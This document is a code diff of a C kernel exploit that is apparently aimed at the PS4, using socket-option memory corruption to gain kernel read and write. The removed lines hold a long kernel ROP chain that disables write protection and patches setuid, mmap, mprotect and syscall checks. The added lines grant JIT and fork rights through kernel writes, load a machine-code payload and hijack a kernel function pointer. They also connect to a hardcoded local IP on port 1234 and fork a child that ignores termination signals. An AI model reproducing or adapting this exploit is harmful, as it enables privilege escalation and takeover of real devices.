@@ -13,6 +13,7 @@ __END_DECLS
 #ifdef __PS4__
 #include <printf/printf.h>
 #include <ps4/mmap.h>
+#include <ps4/errno.h>
 #else
 #include <stdio.h>
 #include <sys/mman.h>
@@ -27,6 +28,7 @@ __END_DECLS
 #include <time.h>
 #include <unistd.h>
 #include <stddef.h>
+#include <signal.h>
 
 #define new_socket() socket(AF_INET6, SOCK_DGRAM, 0)
 
@@ -54,7 +56,7 @@ int set_tclass(int s, int val)
 }
 
 #define TCLASS_MASTER 0x13370000
-#define TCLASS_MASTER_2 0x13380000
+#define TCLASS_MASTER_2 0x73310000
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
 
@@ -218,9 +220,10 @@ void leak_kevent_pktopts(struct opaque* o, int overlap_sock, unsigned long long*
 void write_to_victim(struct opaque* o, unsigned long long addr)
 {
     char buf[sizeof(struct in6_pktinfo)];
+    get_pktinfo(o->master_sock, buf);
     *(unsigned long long*)buf = addr;
-    *(unsigned long long*)(buf+8) = 0;
-    *(unsigned int*)(buf+16) = 0;
+    //*(unsigned long long*)(buf+8) = 0;
+    //*(unsigned int*)(buf+16) = 0;
     if(set_pktinfo(o->master_sock, buf))
         *(volatile int*)0;
 }
@@ -376,17 +379,29 @@ int getpid_via_fork()
 }
 #endif
 
+unsigned long long find_struct_proc(struct opaque* o, int victim, unsigned long long kernel_base)
+{
+    int pid = getpid();
+    unsigned long long proc = kread64(o, victim, kernel_base + 0x22bbe80);
+    while(proc && pid != (int)kread64(o, victim, proc + 0xb0))
+        proc = kread64(o, victim, proc);
+    return proc;
+}
+
+int jitshm_create(int flags, unsigned long long size, int prot);
+int jitshm_alias(int fd, int prot);
+
 int main()
 {
     if(!setuid(0))
         return 179;
-    /*int ufo = socket(AF_INET, SOCK_STREAM, 0);
+    int ufo = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in ufo_addr = {
         .sin_family = AF_INET,
-        .sin_addr = {.s_addr = CENSORED},
+        .sin_addr = {.s_addr = 0xf02ba8c0},
         .sin_port = 0xd204 // htons(1234)
     };
-    connect(ufo, &ufo_addr, sizeof(ufo_addr));*/
+    connect(ufo, &ufo_addr, sizeof(ufo_addr));
     unsigned long long idt_base;
     unsigned short idt_size;
     sidt(&idt_base, &idt_size);
@@ -436,250 +451,78 @@ int main()
     if(victim < 0)
         return 1;
     victim = spray_sock[victim];
-    unsigned long long knote = kread64(&o, victim, ptrs[0] + kevent_sock * 8);
-    unsigned long long kn_fop = kread64(&o, victim, knote + offsetof(struct knote, kn_fop));
-    unsigned long long f_detach = kread64(&o, victim, kn_fop + offsetof(struct filterops, f_detach));
-    unsigned long long kernel_base = f_detach - F_DETACH_OFFSET;
-    save_area_t stash;
-    save_area_t* stash_p = align_16(stash);
-    stash_p[GP_REG_RBP] = 0;
-    unsigned long long flag = 0;
-    unsigned long long knote_0x40 = kread64(&o, victim, knote+0x40);
-    int leave = 187; // krop.length - 1
-    unsigned long long krop[] = {
-        0,
-        __builtin_gadget_addr("cli"), // ensure we don't get preempted
-        kernel_base + READ_CR0_OFFSET,
-        __builtin_gadget_addr("pop rcx"),
-        ~8ull,
-        __builtin_gadget_addr("and rax, rcx"),
-        kernel_base + READ_CR0_OFFSET + 9,
-        __builtin_gadget_addr("pop rdi"),
-        stash_p,
-        __builtin_gadget_addr("$saveall_addr"),
-        __builtin_gadget_addr("pop rdi"), // patch the gadget at [rbp+8] to `sti` so that we return with interrupts enabled
-        (*stash_p) + GP_REG_RBP,
-        __builtin_gadget_addr("mov rax, [rdi]"),
-        __builtin_gadget_addr("pop rcx"),
-        8,
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("pop rcx"),
-        __builtin_gadget_addr("sti"),
-        __builtin_gadget_addr("mov [rax], rcx"),
-        __builtin_gadget_addr("pop rdi"), // back up callee-saved registers (rbx, r12-r15, rbp)
-        (*stash_p) + GP_REG_RBX,
-        __builtin_gadget_addr("pop rsi"),
-        krop + (leave-11),
-        __builtin_gadget_addr("mov rax, [rdi]"),
-        __builtin_gadget_addr("mov [rsi], rax"),
-        __builtin_gadget_addr("pop rdi"),
-        (*stash_p) + GP_REG_R12,
-        __builtin_gadget_addr("pop rsi"),
-        krop + (leave-9),
-        __builtin_gadget_addr("mov rax, [rdi]"),
-        __builtin_gadget_addr("mov [rsi], rax"),
-        __builtin_gadget_addr("pop rdi"),
-        (*stash_p) + GP_REG_R13,
-        __builtin_gadget_addr("pop rsi"),
-        krop + (leave-7),
-        __builtin_gadget_addr("mov rax, [rdi]"),
-        __builtin_gadget_addr("mov [rsi], rax"),
-        __builtin_gadget_addr("pop rdi"),
-        (*stash_p) + GP_REG_R14,
-        __builtin_gadget_addr("pop rsi"),
-        krop + (leave-5),
-        __builtin_gadget_addr("mov rax, [rdi]"),
-        __builtin_gadget_addr("mov [rsi], rax"),
-        __builtin_gadget_addr("pop rdi"),
-        (*stash_p) + GP_REG_R15,
-        __builtin_gadget_addr("pop rsi"),
-        krop + (leave-3),
-        __builtin_gadget_addr("mov rax, [rdi]"),
-        __builtin_gadget_addr("mov [rsi], rax"),
-        __builtin_gadget_addr("pop rdi"),
-        (*stash_p) + GP_REG_RBP,
-        __builtin_gadget_addr("pop rsi"),
-        krop + (leave-1),
-        __builtin_gadget_addr("mov rax, [rdi]"),
-        __builtin_gadget_addr("mov [rsi], rax"),
-        kernel_base + READ_CR0_OFFSET, // disable WP in cr0 (this is probably what causes most crashes)
-        __builtin_gadget_addr("pop rcx"),
-        ~65536ull,
-        __builtin_gadget_addr("and rax, rcx"),
-        __builtin_gadget_addr("pop rbp"),
-        krop + 6,
-        __builtin_gadget_addr("pop r13"),
-        krop,
-        kernel_base + 0x121116, // misaligned mov cr0, rax instruction inside some kernel function
-        0, // add rsp, 0x48
-        0,
-        0,
-        0,
-        0,
-        0,
-        0,
-        0,
-        0,
-        0, // pop rbx
-        0, // pop r12
-        0, // pop r13
-        0, // pop r14
-        0, // pop r15
-        0, // pop rbp
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base, // kernel elf header, safe to temporarily overwrite
-        __builtin_gadget_addr("pop rax"),
-        __builtin_gadget_addr("dq 0xc3008b4865c03148"), // xor rax, rax ; mov rax, [gs:rax] ; ret
-        __builtin_gadget_addr("mov [rdi], rax"),
-        kernel_base, // call it
-        __builtin_gadget_addr("pop rcx"),
-        8, // offsetof(struct thread, td_proc)
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("mov rax, [rax]"),
-        __builtin_gadget_addr("pop rcx"),
-        0x48, // offsetof(struct proc, p_fd)
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("mov rax, [rax]"),
-        __builtin_gadget_addr("mov rax, [rax]"), // offsetof(struct filedesc, fd_ofiles) == 0
-        __builtin_gadget_addr("pop rdi"), // remove master_sock, overlap_sock, victim, cleanup1, cleanup2 from the process' fd table
-        0,
-        __builtin_gadget_addr("pop rcx"),
-        8*(long long)master_sock,
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("mov [rax], rdi"),
-        __builtin_gadget_addr("pop rcx"),
-        8*(long long)(overlap_sock-master_sock),
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("mov [rax], rdi"),
-        __builtin_gadget_addr("pop rcx"),
-        8*(long long)(victim-overlap_sock),
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("mov [rax], rdi"),
-        __builtin_gadget_addr("pop rcx"),
-        8*(long long)(cleanup1-victim),
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("mov [rax], rdi"),
-        __builtin_gadget_addr("pop rcx"),
-        8*(long long)(cleanup2-cleanup1),
-        __builtin_gadget_addr("add rax, rcx"),
-        __builtin_gadget_addr("mov [rax], rdi"),
-        __builtin_gadget_addr("pop rdi"), // restore elf header
-        kernel_base,
-        __builtin_gadget_addr("pop rax"),
-        __builtin_gadget_addr("dq 0x09010102464c457f"),
-        __builtin_gadget_addr("mov [rdi], rax"),
-        __builtin_gadget_addr("pop rdi"), // syscall everywhere
-        kernel_base + 0x490,
-        __builtin_gadget_addr("pop rax"),
-        0,
-        __builtin_gadget_addr("mov [rdi], eax"),
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base + 0x4b2,
-        __builtin_gadget_addr("pop rax"),
-        0x19de9,
-        __builtin_gadget_addr("mov [rdi], rax"),
-        __builtin_gadget_addr("pop rax"), // mmap rwx (from mira)
-        0x37,
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base + 0xab57a,
-        __builtin_gadget_addr("mov [rdi], al"),
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base + 0xab57d,
-        __builtin_gadget_addr("mov [rdi], al"),
-        __builtin_gadget_addr("pop rdi"), // mprotect rwx (from mira)
-        kernel_base + 0x451db8,
-        __builtin_gadget_addr("pop rax"),
-        0x04eb,
-        __builtin_gadget_addr("mov [rdi], ax"),
-        __builtin_gadget_addr("pop rdi"), // setuid (from mira)
-        kernel_base + 0x10bed0,
-        __builtin_gadget_addr("pop rax"),
-        0xb8,
-        __builtin_gadget_addr("mov [rdi], al"),
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base + 0x10bed1,
-        __builtin_gadget_addr("pop rax"),
-        0,
-        __builtin_gadget_addr("mov [rdi], eax"),
-        __builtin_gadget_addr("pop rdi"), // kexec (syscall #11)
-        kernel_base + 0x111e210,
-        __builtin_gadget_addr("pop rax"),
-        2,
-        __builtin_gadget_addr("mov [rdi], rax"),
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base + 0x111e218,
-        __builtin_gadget_addr("pop rax"),
-        kernel_base + 0x31c05c,
-        __builtin_gadget_addr("mov [rdi], rax"),
-        __builtin_gadget_addr("pop rdi"),
-        kernel_base + 0x111e238,
-        __builtin_gadget_addr("pop rax"),
-        __builtin_gadget_addr("dq 0x100000000"),
-        __builtin_gadget_addr("mov [rdi], rax"),
-        kernel_base + READ_CR0_OFFSET, // resets the WP bit as a side effect
-        __builtin_gadget_addr("pop rax"), // userspace waits for this flag to be set
-        179,
-        __builtin_gadget_addr("pop rsi"),
-        &flag,
-        __builtin_gadget_addr("mov [rsi], rax"),
-        __builtin_gadget_addr("pop rbx"), // restore callee-saved registers
-        0,
-        __builtin_gadget_addr("pop r12"),
-        0,
-        __builtin_gadget_addr("pop r13"),
-        0,
-        __builtin_gadget_addr("pop r14"),
-        0,
-        __builtin_gadget_addr("pop r15"),
-        0,
-        __builtin_gadget_addr("pop rbp"),
-        0,
-        __builtin_gadget_addr("leave"), // return to the caller
-    };
-    unsigned long long rax_pivot[29];
-    rax_pivot[0] = __builtin_gadget_addr("$pivot_addr"); // mov rsp, [rdi+0x38] ; pop rdi ; ret
-    rax_pivot[28] = __builtin_gadget_addr("$jop_frame_addr"); // push rbp ; mov rbp, rsp ; mov rax, [rdi] ; call [rax]
-    unsigned long long rdi_pivot[1];
-    rdi_pivot[0] = rax_pivot;
-    rdi_pivot[7] = krop;
-    kwrite64(&o, victim, knote+0x40, rdi_pivot);
-    unsigned long long fake_kn_fop[] = {
+    unsigned long long knote, kn_fop, f_detach, kernel_base;
+    do
+    {
+        knote = kread64(&o, victim, ptrs[0] + kevent_sock * 8);
+        kn_fop = kread64(&o, victim, knote + offsetof(struct knote, kn_fop));
+        f_detach = kread64(&o, victim, kn_fop + offsetof(struct filterops, f_detach));
+        kernel_base = f_detach - F_DETACH_OFFSET;
+    }
+    while(kernel_base & 4095ull);
+    printf("kernel_base = 0x%llx\n", kernel_base);
+    printf("f_detach = 0x%llx, offset = 0x%llx\n", f_detach, F_DETACH_OFFSET);
+    unsigned long long struct_proc = find_struct_proc(&o, victim, kernel_base);
+    printf("struct_proc = 0x%llx\n", struct_proc);
+    printf("getpid() = 0x%x\n", getpid());
+    unsigned long long sysent_base = kernel_base + 0x111e000;
+    // enable jitshm
+    unsigned long long struct_thread = kread64(&o, victim, struct_proc+0x10);
+    unsigned long long thread_0x130 = kread64(&o, victim, struct_thread+0x130);
+    unsigned long long thread_0x130_0x68 = kread64(&o, victim, thread_0x130+0x68);
+    thread_0x130_0x68 |= __builtin_gadget_addr("dq 0x2000000000000000");
+    kwrite64(&o, victim, thread_0x130+0x68, thread_0x130_0x68);
+    int jit1, jit2;
+    errno = 0;
+    jit1 = jitshm_create(0, 16384, PROT_READ|PROT_WRITE|PROT_EXEC);
+    jit2 = jitshm_alias(jit1, PROT_READ|PROT_WRITE);
+    printf("jit: %d %d\n", jit1, jit2);
+    char* page_rx = mmap(NULL, 16384, PROT_READ|PROT_EXEC, MAP_SHARED, jit1, 0);
+    thread_0x130_0x68 &= ~__builtin_gadget_addr("dq 0x2000000000000000");
+    thread_0x130_0x68 |= __builtin_gadget_addr("dq 0x4000000000000000");
+    kwrite64(&o, victim, thread_0x130+0x68, thread_0x130_0x68);
+    char* page_rw = mmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|0xf, jit2, 0);
+    thread_0x130_0x68 &= ~__builtin_gadget_addr("dq 0x4000000000000000");
+    kwrite64(&o, victim, thread_0x130+0x68, thread_0x130_0x68);
+    printf("rx=0x%llx rw=0x%llx\n", page_rx, page_rw);
+    // enable fork
+    unsigned long long thread_0x130_0x60 = kread64(&o, victim, thread_0x130+0x60);
+    thread_0x130_0x60 |= __builtin_gadget_addr("dq 0x4000000000000000");
+    kwrite64(&o, victim, thread_0x130+0x60, thread_0x130_0x60);
+    // load assembly payload
+#include "inline_asm.c"
+    *(unsigned long long*)(page_rw+4056) = f_detach;
+    *(unsigned long long*)(page_rw+4064) = kn_fop;
+    *(unsigned long long*)(page_rw+4072) = kernel_base;
+    *(int*)(page_rw+4084) = master_sock;
+    *(int*)(page_rw+4088) = overlap_sock;
+    *(int*)(page_rw+4092) = victim;
+    printf("page_rx[0] = 0x%x\n", page_rx[0]);
+    unsigned long long fake_kn_fop[5] = {
         kread64(&o, victim, kn_fop),
         kread64(&o, victim, kn_fop+8),
         kread64(&o, victim, kn_fop+16),
         kread64(&o, victim, kn_fop+24),
         kread64(&o, victim, kn_fop+32)
     };
-    ((struct filterops*)fake_kn_fop)->f_detach = 
-#ifdef __PS4__
-        __builtin_gadget_addr("$webkit_base + 0x8043b"); // same as below
-#else
-        __builtin_gadget_addr("mov rdi, [rdi + 0x40] ; mov rax, [rdi] ; call [rax+0xe0]");
-#endif
+    *(unsigned long long*)(((char*)fake_kn_fop)+offsetof(struct filterops, f_detach)) = page_rx;
     kwrite64(&o, victim, knote + offsetof(struct knote, kn_fop), fake_kn_fop);
-    if((kread64(&o, victim, kernel_base) & 0xffffffff) != 0x464c457f) // verify that we are on the right fw
-        printf("warning: kernel base mismatch!\n");
-    unsigned long long u1 = 0x12345678, u2 = 0x87654321;
-    u2 = kread64(&o, victim, &u1);
-    printf("kernel_base = 0x%llx\n", kernel_base);
-    printf("f_detach = 0x%llx, offset = 0x%llx\n", f_detach, f_detach-kernel_base);
-    printf("u1 = 0x%llx, u2 = 0x%llx\n", u1, u2);
-#ifdef __PS4__
-    if(*(unsigned short*)__builtin_gadget_addr("$webkit_base + 0x7cef8") != 0xf4fa) // cli ; hlt, was used for debugging the exploit
-        printf("warning: not cli;hlt at webkit_base + 0x7cef8\n");
-#endif
-    nanosleep("\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
-    int closer[256];
-    pthread_create(closer, NULL, closer_thread, &o);
-    while(!flag)
-        nanosleep("\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
-    nanosleep("\5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
-    printf("exploit finished (?%d)\n", o.triggered);
-    printf("flag = 0x%llx rbp=0x%llx\n", flag, (*stash_p)[GP_REG_RBP]);
-#ifdef __PS4__
-    printf("getpid() via fork() wrapper = %d\n", getpid_via_fork()); // verify syscall patch
-#endif
-    printf("getpid() = %d\n", getpid());
-    printf("setuid(0) = %d\n", setuid(0)); // verify setuid patch
+    write_to_victim(&o, 0);
+    for(int i = 0; i < 256; i++)
+        close(kq[i]);
+    if(!fork())
+    {
+        struct sigaction ignore = {
+            .sa_handler = SIG_IGN,
+            .sa_mask = 0,
+            .sa_flags = 0
+        };
+        sigaction(SIGTERM, &ignore);
+        sigaction(SIGKILL, &ignore);
+        for(int i = 0; i < 9; i++)
+            close(i);
+        for(;;)
+            nanosleep("\xe8\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
+    }
     return 0;
 }
